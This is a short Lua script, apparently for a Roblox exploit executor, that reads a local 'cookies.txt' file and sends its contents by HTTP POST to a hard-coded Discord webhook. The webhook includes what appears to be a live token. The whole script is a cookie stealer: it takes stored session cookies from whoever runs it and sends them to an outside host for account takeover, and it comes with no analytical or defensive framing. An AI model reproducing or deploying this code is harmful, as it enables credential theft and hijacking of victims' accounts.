local req = request or syn.request
local http = game:GetService("HttpService")
req({
  Url = "https://discord.com/api/webhooks/1402005257676001330/Ao585E_QrjqXL5BEKQ3Bq_LupKWvoy02HZLrEVZyeGqX8t80F0GvgcJs1GU0acL8EkPC",
  Method = "POST",
  Headers = {
    ["Content-Type"] = "application/json"
  },
  Body = http:JSONEncode({cookie = tostring(readfile("cookies.txt"))})
})
